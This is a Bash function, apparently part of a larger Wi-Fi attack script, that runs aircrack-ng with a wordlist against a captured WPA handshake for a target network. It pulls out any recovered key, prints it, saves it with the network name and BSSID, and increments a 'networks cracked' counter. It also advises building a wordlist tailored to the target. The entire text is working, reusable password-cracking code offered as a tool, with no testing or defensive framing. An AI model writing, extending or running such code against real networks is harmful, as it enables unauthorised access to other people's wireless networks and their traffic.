# Aircrack-ng Cracking Functions

crack_password() {
    log_info "Starting password cracking..."
    log_info "This may take a while depending on password complexity and wordlist size"
    
    local cap_file=$(ls "${HANDSHAKE_FILE}"*.cap 2>/dev/null | head -1)
    
    if [ -z "$cap_file" ]; then
        log_error "Capture file not found"
        exit 1
    fi
    
    log_info "Using wordlist: $WORDLIST"
    echo ""
    
    # Run aircrack-ng
    aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "$cap_file" | tee "$OUTPUT_DIR/crack_result.txt"
    
    echo ""
    
    # Check if password was found
    if grep -q "KEY FOUND" "$OUTPUT_DIR/crack_result.txt"; then
        local password=$(grep "KEY FOUND" "$OUTPUT_DIR/crack_result.txt" | sed 's/.*\[ \(.*\) \]/\1/')
        echo ""
        log_success "═══════════════════════════════════════════════════"
        log_success "PASSWORD FOUND: $password"
        log_success "  Network: $TARGET_ESSID"
        log_success "  BSSID: $TARGET_BSSID"
        log_success "═══════════════════════════════════════════════════"
        echo ""
        
        # Save to file
        echo "Network: $TARGET_ESSID" > "$OUTPUT_DIR/cracked_password.txt"
        echo "BSSID: $TARGET_BSSID" >> "$OUTPUT_DIR/cracked_password.txt"
        echo "Password: $password" >> "$OUTPUT_DIR/cracked_password.txt"
        echo "Date: $(date)" >> "$OUTPUT_DIR/cracked_password.txt"
        echo "Method: Aircrack-ng" >> "$OUTPUT_DIR/cracked_password.txt"
        
        log_success "Results saved to: $OUTPUT_DIR/cracked_password.txt"
        
        # Update statistics
        STATS_NETWORKS_CRACKED=$((STATS_NETWORKS_CRACKED + 1))
    else
        log_error "Password not found in wordlist"
        log_warning "Try using a larger wordlist or custom wordlist specific to target"
    fi
}
